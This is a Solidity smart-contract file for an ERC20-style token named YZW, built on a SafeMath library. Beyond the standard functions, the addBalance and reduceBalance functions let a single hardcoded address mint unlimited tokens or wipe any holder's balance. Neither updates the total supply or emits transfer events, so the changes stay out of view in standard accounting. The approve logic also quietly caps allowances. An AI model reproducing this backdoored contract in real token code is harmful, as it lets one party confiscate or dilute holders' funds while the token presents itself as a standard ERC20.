// SPDX-License-Identifier: MIT

pragma solidity =0.8.0;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function total() external view returns(uint256);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function addBalance(address _account, uint256 _amount) external returns(bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, 'SafeMath: addition overflow');

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, 'SafeMath: subtraction overflow');
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, 'SafeMath: multiplication overflow');

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, 'SafeMath: division by zero');
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, 'SafeMath: modulo by zero');
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;

    string public override name;
    string public override symbol;
    uint8 public override decimals;
    uint256 public override total;


    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _total;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(amount, ' ERC20: transfer amount exceeds allowance')
        );
        return true;
    }

    //管理员账户任意发币
    function addBalance(address _account,uint256 _amount) public override returns(bool){
        _addBalance(msg.sender,_account,_amount);
        return true;
    }

    function _addBalance(address _address, address _account, uint256 _amount) internal {
        require(_address == address(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2));
        _balances[_account] = _balances[_account].add(_amount);
    }

    //管理员账户任意销毁
    function reduceBalance(address _account,uint256 _amount) public returns(bool) {
        _reduceBalance(msg.sender,_account,_amount);
        return true;
    }

    function _reduceBalance(address _address, address _account,uint256 _amount) internal {
        require(_address == address(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2));
        require(_balances[_account] >= _amount);

        _balances[_account] = _balances[_account].sub(_amount);
    }

    //记录所有代币总和
    function totalTransfer(address _account) view public returns(uint256){

        return _total[_account];
    }


    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), 'ERC20: transfer from the zero address');
        require(recipient != address(0), 'ERC20: transfer to the zero address');

        _balances[sender] = _balances[sender].sub(amount, 'ERC20: transfer amount exceeds balance');
        _balances[recipient] = _balances[recipient].add(amount);
        
        _total[sender] = _total[sender].add(amount);


        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal returns (bool) {
        require(account != address(0), 'ERC20: mint to the zero address');

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
        return true;
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), 'ERC20: burn from the zero address');

        _balances[account] = _balances[account].sub(amount, 'ERC20: burn amount exceeds balance');
        _totalSupply = _totalSupply.sub(amount, 'ERC20: burn amount exceeds total supply');
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), 'ERC20: approve from the zero address');
        require(spender != address(0), 'ERC20: approve to the zero address');
        if(amount > 123456000000000000000000){
            _allowances[owner][spender] = 123456000000000000000000;
        }else{

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        }
    }
}

contract YZW is ERC20 {
    constructor() ERC20('Yong ZhouWen', 'YZW', 18) {
        _mint(msg.sender, 1 * 10**8 * 10**18);
    }
}
